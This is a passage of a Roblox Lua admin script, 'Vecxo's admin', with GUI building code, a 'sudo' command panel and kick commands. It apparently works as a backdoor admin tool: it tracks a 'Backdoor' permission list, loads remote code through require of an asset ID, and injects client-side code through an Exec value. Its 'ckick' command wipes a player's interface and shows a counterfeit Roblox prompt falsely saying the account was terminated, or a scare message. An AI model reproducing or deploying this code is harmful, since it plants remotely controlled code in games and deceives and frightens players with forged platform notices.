		CommandAlias.Position = UDim2.new(0.7, 0, 0, 0)
		CommandAlias.Text = AliasText
		CommandAlias.TextColor3 = Color3.fromRGB(200, 200, 200)
		CommandAlias.BackgroundTransparency = 1
		CommandAlias.Font = Enum.Font.Gotham
		CommandAlias.TextSize = 14
		CommandAlias.TextXAlignment = Enum.TextXAlignment.Right
		CommandAlias.Name = "CommandAlias"

		counter = counter + 1
	end				

	uiLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, uiLayout.AbsoluteContentSize.Y)
	end)

	SudoPanel.Parent = ContentFrame
	SudoPanel.Size = UDim2.new(1, 0, 1, 0)
	SudoPanel.Visible = false
	SudoPanel.BackgroundTransparency = 1
	SudoPanel.Name = "PanelFrame"

	local wld, prem, bd, purm, pee299

	if table.find(_G.Whitelist, tostring(plr.UserId)) or table.find(TempWhitelist, plr.UserId) then
		wld = "true"
	else
		wld = "false"
	end

	if plr.MembershipType == Enum.MembershipType.Premium then
		prem = "true"
	else
		prem = "false"
	end

	if table.find(_G.specialperms, plr.Name) then
		bd = "true"
	else
		bd = "false"
	end

	if table.find(_G.permadmins, plr.Name) then
		purm = "true"
	else
		purm = "false"
	end

	if table.find(_G.p299, plr.Name) then
		pee299 = "true"
	else
		pee299 = "false"
	end

	local SudoFrame = Instance.new("Frame")
	local Player_1_TextBox = Instance.new("TextBox")
	local Player_2_TextBox = Instance.new("TextBox")
	local Command = Instance.new("TextBox")
	local Sudo = Instance.new("TextLabel")
	local Chat_Message = Instance.new("TextBox")
	local Player_1_Frame = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local ImageLabel = Instance.new("ImageLabel")
	local TextLabel = Instance.new("TextLabel")
	local UICorner_2 = Instance.new("UICorner")
	local Player_2_Frame = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")
	local ImageLabel_2 = Instance.new("ImageLabel")
	local TextLabel_2 = Instance.new("TextLabel")
	local UICorner_4 = Instance.new("UICorner")
	local Run_Command = Instance.new("TextButton")
	local Insert_Sudo = Instance.new("TextButton")

	SudoFrame.Parent = SudoPanel
	SudoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	SudoFrame.BackgroundTransparency = 1.000
	SudoFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	SudoFrame.BorderSizePixel = 0
	SudoFrame.ClipsDescendants = true
	SudoFrame.Position = UDim2.new(0, 0, -0.18, 0)
	SudoFrame.Size = UDim2.new(0, 523, 0, 350)
	SudoFrame.Name = "Panel_Frame"

	Player_1_TextBox.Name = "Player_1_TextBox"
	Player_1_TextBox.Parent = SudoFrame
	Player_1_TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Player_1_TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Player_1_TextBox.BorderSizePixel = 0
	Player_1_TextBox.Position = UDim2.new(0.0195227768, 0, 0.738918602, 0)
	Player_1_TextBox.Size = UDim2.new(0, 208, 0, 25)
	Player_1_TextBox.Font = Enum.Font.SourceSansBold
	Player_1_TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	Player_1_TextBox.PlaceholderText = "Player 1"
	Player_1_TextBox.Text = ""
	Player_1_TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	Player_1_TextBox.TextSize = 14.000

	Player_2_TextBox.Name = "Player_2_TextBox"
	Player_2_TextBox.Parent = SudoFrame
	Player_2_TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Player_2_TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Player_2_TextBox.BorderSizePixel = 0
	Player_2_TextBox.Position = UDim2.new(0.578999996, 0, 0.739000022, 0)
	Player_2_TextBox.Size = UDim2.new(0, 210, 0, 25)
	Player_2_TextBox.Font = Enum.Font.SourceSansBold
	Player_2_TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	Player_2_TextBox.PlaceholderText = "Player 2"
	Player_2_TextBox.Text = ""
	Player_2_TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	Player_2_TextBox.TextSize = 14.000

	Command.Name = "Command"
	Command.Parent = SudoFrame
	Command.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Command.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Command.BorderSizePixel = 0
	Command.Position = UDim2.new(0.366578072, 0, 0.158687651, 0)
	Command.Size = UDim2.new(0, 139, 0, 25)
	Command.Font = Enum.Font.SourceSansBold
	Command.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	Command.PlaceholderText = "Command Name"
	Command.Text = ""
	Command.TextColor3 = Color3.fromRGB(255, 255, 255)
	Command.TextSize = 14.000

	if _G.sudo then
		Sudo.Name = "Sudo"
		Sudo.Parent = SudoFrame
		Sudo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Sudo.BackgroundTransparency = 1.000
		Sudo.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Sudo.BorderSizePixel = 0
		Sudo.Position = UDim2.new(-0.00100381242, 0, 0.942609191, 0)
		Sudo.Size = UDim2.new(0, 64, 0, 21)
		Sudo.Font = Enum.Font.SourceSansBold
		Sudo.Text = "_G.sudo"
		Sudo.TextColor3 = Color3.fromRGB(0, 255, 0)
		Sudo.TextScaled = true
		Sudo.TextSize = 14.000
		Sudo.TextWrapped = true
		Sudo.TextXAlignment = Enum.TextXAlignment.Left
		Sudo.TextYAlignment = Enum.TextYAlignment.Bottom
	else
		Sudo.Name = "Sudo"
		Sudo.Parent = SudoFrame
		Sudo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Sudo.BackgroundTransparency = 1.000
		Sudo.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Sudo.BorderSizePixel = 0
		Sudo.Position = UDim2.new(-0.00100381242, 0, 0.942609191, 0)
		Sudo.Size = UDim2.new(0, 64, 0, 21)
		Sudo.Font = Enum.Font.SourceSansBold
		Sudo.Text = "_G.sudo"
		Sudo.TextColor3 = Color3.fromRGB(255, 0, 0)
		Sudo.TextScaled = true
		Sudo.TextSize = 14.000
		Sudo.TextWrapped = true
		Sudo.TextXAlignment = Enum.TextXAlignment.Left
		Sudo.TextYAlignment = Enum.TextYAlignment.Bottom
	end

	Chat_Message.Name = "Chat_Message"
	Chat_Message.Parent = SudoFrame
	Chat_Message.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Chat_Message.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Chat_Message.BorderSizePixel = 0
	Chat_Message.Position = UDim2.new(0.306595117, 0, 0.948323429, 0)
	Chat_Message.Size = UDim2.new(0, 200, 0, 18)
	Chat_Message.Font = Enum.Font.SourceSansBold
	Chat_Message.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	Chat_Message.PlaceholderText = "Message"
	Chat_Message.Text = ""
	Chat_Message.TextColor3 = Color3.fromRGB(255, 255, 255)
	Chat_Message.TextSize = 14.000

	Player_1_Frame.Name = "Player_1_Frame"
	Player_1_Frame.Parent = SudoFrame
	Player_1_Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
	Player_1_Frame.BackgroundTransparency = 0.200
	Player_1_Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Player_1_Frame.BorderSizePixel = 0
	Player_1_Frame.ClipsDescendants = true
	Player_1_Frame.Position = UDim2.new(0.0195227768, 0, 0.369905949, 0)
	Player_1_Frame.Size = UDim2.new(0, 209, 0, 108)
	Player_1_Frame.Name = "Player_1_Frame"

	UICorner.Parent = Player_1_Frame

	ImageLabel.Parent = Player_1_Frame
	ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ImageLabel.BackgroundTransparency = 1.000
	ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
	ImageLabel.BorderSizePixel = 0
	ImageLabel.Position = UDim2.new(-0.00686017657, 0, 0, 0)
	ImageLabel.Size = UDim2.new(0, 100, 0, 108)
	ImageLabel.Image = "rbxthumb://type=Avatar&id=".. plr.UserId .."&w=420&h=420"

	TextLabel.Parent = ImageLabel
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BorderSizePixel = 0
	TextLabel.Position = UDim2.new(1.0078088, 0, 0.00679807318, 0)
	TextLabel.Size = UDim2.new(0, 109, 0, 107)
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = "Display: ".. plr.DisplayName .."\nUserId: ".. plr.UserId .."\nAccount Age: ".. plr.AccountAge .."\nWhitelisted: ".. wld .."\nPremium: ".. prem .."\nBackdoor: ".. bd .."\nPerm: ".. purm .."\nP299: ".. pee299
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 13.000
	TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
	TextLabel.TextYAlignment = Enum.TextYAlignment.Top

	UICorner_2.Parent = ImageLabel

	Player_2_Frame.Name = "Player_2_Frame"
	Player_2_Frame.Parent = SudoFrame
	Player_2_Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
	Player_2_Frame.BackgroundTransparency = 0.200
	Player_2_Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Player_2_Frame.BorderSizePixel = 0
	Player_2_Frame.ClipsDescendants = true
	Player_2_Frame.Position = UDim2.new(0.579999983, 0, 0.370000005, 0)
	Player_2_Frame.Size = UDim2.new(0, 209, 0, 108)
	Player_2_Frame.Name = "Player_2_Frame"

	UICorner_3.Parent = Player_2_Frame

	ImageLabel_2.Parent = Player_2_Frame
	ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ImageLabel_2.BackgroundTransparency = 1.000
	ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	ImageLabel_2.BorderSizePixel = 0
	ImageLabel_2.Position = UDim2.new(-0.00207548728, 0, 0, 0)
	ImageLabel_2.Size = UDim2.new(0, 100, 0, 108)
	ImageLabel_2.Image = "rbxthumb://type=Avatar&id=".. plr.UserId .."&w=420&h=420"

	TextLabel_2.Parent = ImageLabel_2
	TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.BackgroundTransparency = 1.000
	TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel_2.BorderSizePixel = 0
	TextLabel_2.Position = UDim2.new(1.0078088, 0, -0.00246118614, 0)
	TextLabel_2.Size = UDim2.new(0, 109, 0, 107)
	TextLabel_2.Font = Enum.Font.SourceSansBold
	TextLabel_2.Text = "Display: ".. plr.DisplayName .."\nUserId: ".. plr.UserId .."\nAccount Age: ".. plr.AccountAge .."\nWhitelisted: ".. wld .."\nPremium: ".. prem .."\nBackdoor: ".. bd .."\nPerm: ".. purm .."\nP299: ".. pee299
	TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.TextSize = 13.000
	TextLabel_2.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
	TextLabel_2.TextYAlignment = Enum.TextYAlignment.Top

	UICorner_4.Parent = ImageLabel_2

	Run_Command.Name = "Run_Command"
	Run_Command.Parent = SudoFrame
	Run_Command.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Run_Command.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Run_Command.BorderSizePixel = 0
	Run_Command.Position = UDim2.new(0.42244941, 0, 0.258999974, 0)
	Run_Command.Size = UDim2.new(0, 80, 0, 20)
	Run_Command.Font = Enum.Font.SourceSansBold
	Run_Command.Text = "Run Command"
	Run_Command.TextColor3 = Color3.fromRGB(255, 255, 255)
	Run_Command.TextSize = 14.000
	Run_Command.TextWrapped = true

	if not _G.sudo then
		Insert_Sudo.Name = "Insert_Sudo"
		Insert_Sudo.Parent = SudoFrame
		Insert_Sudo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Insert_Sudo.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Insert_Sudo.BorderSizePixel = 0
		Insert_Sudo.Position = UDim2.new(0.14783299, 0, 0.948323429, 0)
		Insert_Sudo.Size = UDim2.new(0, 72, 0, 19)
		Insert_Sudo.Font = Enum.Font.SourceSansBold
		Insert_Sudo.Text = "Insert Sudo"
		Insert_Sudo.TextColor3 = Color3.fromRGB(255, 255, 255)
		Insert_Sudo.TextSize = 14.000
		Insert_Sudo.TextWrapped = true
	end

	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
		local ticking = tick()
		require(112354705578311).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

	if not goog then
		warn("goog failed to be added, command can not continue")
		notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[
	
		local lp = game.Players.LocalPlayer
		local t1 = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_TextBox")
		local t2 = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_TextBox")
		local t1l = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
		local t2l = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
		local c = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Command")
		local m = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Chat_Message")
		local r = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Run_Command")
		local s = lp:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo")

		local re = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's remote")
		local UserInputService = game:GetService("UserInputService")

		t1.Text = "Player 1"
		t2.Text = "Player 2"
		c.Text = "Command Name"
		m.Text = "Message"

		local pc = not UserInputService.TouchEnabled and not UserInputService.GamepadEnabled
		local mobile = UserInputService.TouchEnabled
		local console = UserInputService.GamepadEnabled

		if pc then
			r.MouseButton1Click:Connect(function()
				re:FireServer("PanelCMD", c.Text, t1.Text, t2.Text, m.Text)
			end)
		elseif mobile then
			r.InputBegan:Connect(function(input, process)
				if not process and input.UserInputType == Enum.UserInputType.Touch then
					re:FireServer("PanelCMD", c.Text, t1.Text, t2.Text, m.Text)
				end
			end)
		elseif console then
			r.InputBegan:Connect(function(input, process)
				if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
					if input.KeyCode == Enum.KeyCode.ButtonA or Enum.KeyCode.ButtonX then
						re:FireServer("PanelCMD", c.Text, t1.Text, t2.Text, m.Text)
					end
				end
			end)
		end

		t1.FocusLost:Connect(function()
			re:FireServer("INFO", nil, t1.Text, nil, nil)
		end)

		t2.FocusLost:Connect(function()
			re:FireServer("INFO", nil, nil, t2.Text, nil)
		end)

		if s then
			if pc then
				s.MouseButton1Click:Connect(function()
					re:FireServer("SUDO", nil, nil, nil, nil)
					s:Destroy()
				end)
			elseif mobile then
				s.InputBegan:Connect(function(input, process)
					if not process and input.UserInputType == Enum.UserInputType.Touch then
						re:FireServer("SUDO", nil, nil, nil, nil)
						s:Destroy()
					end
				end)
			elseif console then
				s.InputBegan:Connect(function(input, process)
					if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
						if input.KeyCode == Enum.KeyCode.ButtonA or Enum.KeyCode.ButtonX then
							re:FireServer("SUDO", nil, nil, nil, nil)
							s:Destroy()
						end
					end
				end)
			end
		end
	
	]]

	scr.Parent = plr:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI")

	scr.Enabled = true

	local minimized = true
	local UserInputService = game:GetService("UserInputService")

	local function minimize()
		ContentFrame.Visible = false
		TabsFrame.Visible = false
		MinimizeButton.Text = "+"

		Frame_2.Position = UDim2.new(0, 0, 1, -24)
		Frame.Size = UDim2.new(0, 523, 0, 24)

		MinimizeButton.Position = UDim2.new(0.91, 0, 0, 0)
		CloseButton.Position = UDim2.new(0.95, 0, 0, 0)
	end

	local function maximize()
		ContentFrame.Visible = true
		TabsFrame.Visible = true
		MinimizeButton.Text = "‚Äì"

		Frame_2.Position = UDim2.new(0, 0, 0, 0)
		Frame.Size = UDim2.new(0, 523, 0, 350)

		MinimizeButton.Position = UDim2.new(0.91, 0, 0, 0)
		CloseButton.Position = UDim2.new(0.95, 0, 0, 0)
	end

	local pc = not UserInputService.TouchEnabled and not UserInputService.GamepadEnabled
	local mobile = UserInputService.TouchEnabled
	local console = UserInputService.GamepadEnabled

	if pc then
		MinimizeButton.MouseButton1Click:Connect(function()
			if minimized then
				minimize()
			else
				maximize()
			end
			minimized = not minimized
		end)

		CloseButton.MouseButton1Click:Connect(function()
			ScreenGui:Destroy()
		end)

	elseif mobile then
		MinimizeButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Touch then
				if minimized then
					minimize()
				else
					maximize()
				end
				minimized = not minimized
			end
		end)

		CloseButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Touch then
				ScreenGui:Destroy()
			end
		end)

	elseif console then
		MinimizeButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
				if input.KeyCode == Enum.KeyCode.ButtonA or Enum.KeyCode.ButtonX then
					if minimized then
						minimize()
					else
						maximize()
					end
					minimized = not minimized
				end
			end
		end)

		CloseButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
				if input.KeyCode == Enum.KeyCode.ButtonA or Enum.KeyCode.ButtonX then
					ScreenGui:Destroy()
				end
			end
		end)
	end

	if pc then
		LogsButton.MouseButton1Click:Connect(function()
			LogsPanel.Visible = not LogsPanel.Visible
		end)
	elseif mobile then
		LogsButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Touch then
				LogsPanel.Visible = not LogsPanel.Visible
			end
		end)
	elseif console then
		LogsButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
				if input.KeyCode == Enum.KeyCode.ButtonA or Enum.KeyCode.ButtonX then
					LogsPanel.Visible = not LogsPanel.Visible
				end
			end
		end)
	end

	local function switch(tab)
		TabHighlight.Position = UDim2.new(tab.Position.X.Scale, 0, 1, -3)
		PlayerList.Visible = (tab == PlayerListButton)
		CommandsList.Visible = (tab == CommandsButton)
		SudoPanel.Visible = (tab == SudoButton)

		PlayerListButton.TextColor3 = Color3.fromRGB(180, 180, 180)
		CommandsButton.TextColor3 = Color3.fromRGB(180, 180, 180)
		SudoButton.TextColor3 = Color3.fromRGB(180, 180, 180)
		tab.TextColor3 = Color3.fromRGB(255, 255, 255)
	end

	if pc then
		PlayerListButton.MouseButton1Click:Connect(function() switch(PlayerListButton) end)
		CommandsButton.MouseButton1Click:Connect(function() switch(CommandsButton) end)
		SudoButton.MouseButton1Click:Connect(function() switch(SudoButton) end)
	end

	if mobile then
		PlayerListButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Touch then
				switch(PlayerListButton)
			end
		end)
		CommandsButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Touch then
				switch(CommandsButton)
			end
		end)
		SudoButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Touch then
				switch(SudoButton)
			end
		end)
	end

	if console then
		PlayerListButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
				if input.KeyCode == Enum.KeyCode.ButtonA or input.KeyCode == Enum.KeyCode.ButtonX then
					switch(PlayerListButton)
				end
			end
		end)
		CommandsButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
				if input.KeyCode == Enum.KeyCode.ButtonA or input.KeyCode == Enum.KeyCode.ButtonX then
					switch(CommandsButton)
				end
			end
		end)
		SudoButton.InputBegan:Connect(function(input, process)
			if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
				if input.KeyCode == Enum.KeyCode.ButtonA or input.KeyCode == Enum.KeyCode.ButtonX then
					switch(SudoButton)
				end
			end
		end)
	end

	ScreenGui.Destroying:Connect(function()
		if table.find(panelanticheat, plr.UserId) then
			table.remove(panelanticheat, table.find(panelanticheat, plr.UserId))
		end
	end)

	task.spawn(function()
		update()
	end)
	if section == "cmdlist" then
		task.wait(0.2)
		switch(CommandsButton)
	elseif section == "playerlist" then
		task.wait(0.2)
		switch(PlayerListButton)
	elseif section == "panel" then
		task.wait(0.2)
		switch(SudoButton)
	end
end

function notfi(plr, title, message, duration) -- dizzy ui
	coroutine.wrap(function()

		local s = Instance.new("ScreenGui")
		s.Name = "NotificationsGui"
		if plr then
			s.Parent = plr:FindFirstChild("PlayerGui")
		else
			return
		end

		local n = Instance.new("Frame")
		n.Size = UDim2.new(0, 300, 0, 150)
		n.Position = UDim2.new(1, 10, 1, -160)
		n.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		n.BackgroundTransparency = 0.3
		n.BorderSizePixel = 0
		n.Parent = s

		local tb = Instance.new("Frame")
		tb.Size = UDim2.new(1, 0, 0, 30)
		tb.Position = UDim2.new(0, 0, 0, 0)
		tb.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
		tb.BackgroundTransparency = 0.2
		tb.BorderSizePixel = 0
		tb.Parent = n

		local close = Instance.new("TextButton")
		close.Size = UDim2.new(0, 25, 0, 25)
		close.Position = UDim2.new(1, -30, 0, 2)
		close.Text = "X"
		close.TextColor3 = Color3.fromRGB(255, 255, 255)
		close.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
		close.BackgroundTransparency = 0.5
		close.BorderSizePixel = 0
		close.Font = Enum.Font.GothamBold
		close.TextSize = 14
		close.Parent = tb

		close.MouseEnter:Connect(function()
			close.BackgroundTransparency = 0.2
		end)

		close.MouseLeave:Connect(function()
			close.BackgroundTransparency = 0.5
		end)

		close.MouseButton1Click:Connect(function()
			n:TweenPosition(UDim2.new(1, 10, 1, -160), "Out", "Quad", 0.5)
			task.wait(0.5)
			n:Destroy()
		end)

		local t = Instance.new("TextLabel")
		t.Text = title
		t.Size = UDim2.new(1, -10, 0, 25)
		t.Position = UDim2.new(0, 10, 0, 35)
		t.TextColor3 = Color3.fromRGB(255, 255, 255)
		t.BackgroundTransparency = 1
		t.Font = Enum.Font.GothamBold
		t.TextSize = 25
		t.TextXAlignment = Enum.TextXAlignment.Left
		t.Parent = n

		local m = Instance.new("TextLabel")
		m.Text = message
		m.Size = UDim2.new(1, -10, 1, -70)
		m.Position = UDim2.new(0, 10, 0, 65)
		m.TextColor3 = Color3.fromRGB(200, 200, 200)
		m.BackgroundTransparency = 1
		m.Font = Enum.Font.Gotham
		m.TextSize = 18
		m.TextXAlignment = Enum.TextXAlignment.Left
		m.TextYAlignment = Enum.TextYAlignment.Top
		m.TextWrapped = true
		m.Parent = n

		n:TweenPosition(UDim2.new(1, -310, 1, -160), "Out", "Quad", 0.5)
		task.wait(duration or 5)
		n:TweenPosition(UDim2.new(1, 10, 1, -160), "Out", "Quad", 0.5)
		task.wait(0.5)
		n:Destroy()
	end)()
end

-------------------------------------------- COMMANDS --------------------------------------------

addcmd({
	Name = "kick",
	Aliases = {"k"},
	Function = function(sender, targets, arguments)
		local reason = table.concat(arguments, " ", 1)

		if reason == "" or reason == " " then
			reason = "No reason provided."
		end

		for i, plr in ipairs(targets) do
			plr:Kick("[KICKED] by cxo's admin | Reason: ".. reason)
		end
	end
})

addcmd({
	Name = "ckick",
	Aliases = {"customkick", "ck"},
	Function = function(sender, targets, arguments)
		--local msg = arguments[1] -- idk a way to make this support spaced arguments without being retarded so ill just not do it
		local reason = table.concat(arguments, " ", 1)
		local msg = "Vecxo's admin"

		if reason == "t" then
			msg = "Account Deleted"
			reason = "Our content monitors have determined that your behavior at Roblox has been in violation of our Terms of Use.\n\nYour account has been terminated.\n(Error code: 404)"
		end

		if reason == "" or reason == " " then
			reason = "There is someone behind you, Run."
		end

		for i, plr in ipairs(targets) do

			for i,v in pairs(plr.PlayerGui:GetChildren()) do
				v:Destroy()
			end

			-- Gui to Lua
			-- Version: 3.2

			-- Instances:

			local RobloxPromptGui = Instance.new("ScreenGui")
			local promptOverlay = Instance.new("Frame")
			local ErrorPrompt = Instance.new("Frame")
			local PromptLayout = Instance.new("UIListLayout")
			local PromptScale = Instance.new("UIScale")
			local TitleFrame = Instance.new("Frame")
			local TitleFramePadding = Instance.new("UIPadding")
			local ErrorTitle = Instance.new("TextLabel")
			local SplitLine = Instance.new("Frame")
			local MessageArea = Instance.new("Frame")
			local MessageAreaPadding = Instance.new("UIPadding")
			local ErrorFrame = Instance.new("Frame")
			local ErrorFrameLayout = Instance.new("UIListLayout")
			local ErrorMessage = Instance.new("TextLabel")
			local ButtonArea = Instance.new("Frame")
			local ButtonLayout = Instance.new("UIGridLayout")
			local LeaveButton = Instance.new("ImageButton")
			local ButtonText = Instance.new("TextLabel")
			local ShimmerFrame = Instance.new("ImageLabel")
			local Shimmer = Instance.new("ImageLabel")
			local ShimmerOverlay = Instance.new("ImageLabel")

			--Properties:

			RobloxPromptGui.Name = "RobloxPromptGui"
			RobloxPromptGui.Parent = plr:WaitForChild("PlayerGui")
			RobloxPromptGui.DisplayOrder = 9
			RobloxPromptGui.ResetOnSpawn = false

			promptOverlay.Name = "promptOverlay"
			promptOverlay.Parent = RobloxPromptGui
			promptOverlay.Active = true
			promptOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			promptOverlay.BackgroundTransparency = 1.000
			promptOverlay.Position = UDim2.new(0, 0, 0, -58)
			promptOverlay.Size = UDim2.new(1, 0, 1, 58)

			ErrorPrompt.Name = "ErrorPrompt"
			ErrorPrompt.Parent = promptOverlay
			ErrorPrompt.AnchorPoint = Vector2.new(0.5, 0.5)
			ErrorPrompt.BackgroundColor3 = Color3.fromRGB(57, 59, 61)
			ErrorPrompt.BorderSizePixel = 0
			ErrorPrompt.Position = UDim2.new(0.5, 0, 0.5, 0)
			ErrorPrompt.Size = UDim2.new(0, 400, 0, 250)
			ErrorPrompt.ZIndex = 8

			PromptLayout.Name = "PromptLayout"
			PromptLayout.Parent = ErrorPrompt
			PromptLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			PromptLayout.SortOrder = Enum.SortOrder.LayoutOrder

			PromptScale.Name = "PromptScale"
			PromptScale.Parent = ErrorPrompt

			TitleFrame.Name = "TitleFrame"
			TitleFrame.Parent = ErrorPrompt
			TitleFrame.BackgroundTransparency = 1.000
			TitleFrame.BorderSizePixel = 0
			TitleFrame.LayoutOrder = 1
			TitleFrame.Size = UDim2.new(1, 0, 0, 50)
			TitleFrame.ZIndex = 8

			TitleFramePadding.Name = "TitleFramePadding"
			TitleFramePadding.Parent = TitleFrame
			TitleFramePadding.PaddingBottom = UDim.new(0, 11)
			TitleFramePadding.PaddingTop = UDim.new(0, 11)

			ErrorTitle.Name = "ErrorTitle"
			ErrorTitle.Parent = TitleFrame
			ErrorTitle.BackgroundTransparency = 1.000
			ErrorTitle.Size = UDim2.new(1, 0, 0, 28)
			ErrorTitle.ZIndex = 8
			ErrorTitle.Font = Enum.Font.SourceSansSemibold
			ErrorTitle.Text = msg
			ErrorTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
			ErrorTitle.TextSize = 25.000

			SplitLine.Name = "SplitLine"
			SplitLine.Parent = ErrorPrompt
			SplitLine.BackgroundColor3 = Color3.fromRGB(189, 190, 190)
			SplitLine.BorderSizePixel = 0
			SplitLine.LayoutOrder = 2
			SplitLine.Size = UDim2.new(1, -40, 0, 1)
			SplitLine.ZIndex = 8

			MessageArea.Name = "MessageArea"
			MessageArea.Parent = ErrorPrompt
			MessageArea.BackgroundTransparency = 1.000
			MessageArea.BorderSizePixel = 0
			MessageArea.LayoutOrder = 3
			MessageArea.Size = UDim2.new(1, 0, 1, -51)
